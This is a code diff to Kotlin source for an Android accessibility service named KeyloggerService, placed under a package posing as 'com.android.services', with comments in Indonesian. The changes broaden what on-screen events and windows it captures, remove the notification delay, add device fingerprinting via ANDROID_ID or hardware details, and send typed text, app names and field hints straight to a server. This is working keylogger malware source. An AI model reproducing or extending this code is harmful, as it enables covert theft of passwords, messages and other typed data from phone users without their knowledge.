@@ -2,9 +2,10 @@ package com.android.services
 
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
-import android.content.Context
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
+import android.provider.Settings
 import android.view.KeyEvent
 import android.view.accessibility.AccessibilityEvent
 import com.google.gson.JsonObject
@@ -41,13 +42,16 @@ class KeyloggerService : AccessibilityService() {
     override fun onServiceConnected() {
         serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes  =
-                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED     or
-                AccessibilityEvent.TYPE_VIEW_FOCUSED          or
-                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
+                AccessibilityEvent.TYPE_VIEW_FOCUSED            or
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED    or
+                AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
-            flags        = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
-                           AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
-            notificationTimeout = 50
+            flags        =
+                AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS              or
+                AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS    or
+                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
+            notificationTimeout = 0
         }
     }
 
@@ -180,10 +184,23 @@ class KeyloggerService : AccessibilityService() {
         handler.postDelayed(run, 250)
     }
 
+    // ── Resolusi deviceId identik dengan ConnectorService ────────────────────
+    private fun resolveDeviceId(): String {
+        @Suppress("HardwareIds")
+        val androidId = Settings.Secure.getString(
+            contentResolver, Settings.Secure.ANDROID_ID
+        )?.takeIf { it.isNotBlank() && it != "9774d56d682e549c" }
+        return if (androidId != null) {
+            androidId
+        } else {
+            val hw = "${Build.MANUFACTURER}:${Build.MODEL}:${Build.BOARD}:${Build.HARDWARE}"
+            hw.hashCode().toString().replace("-", "x")
+        }
+    }
+
     // ── Kirim langsung ke server tanpa debounce ───────────────────────────────
     private fun sendNow(pkg: String, fieldHint: String, text: String) {
-        val prefs    = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
-        val deviceId = prefs.getString("device_id", null) ?: return
+        val deviceId = resolveDeviceId()
 
         val body = JsonObject().apply {
             addProperty("deviceId",   deviceId)
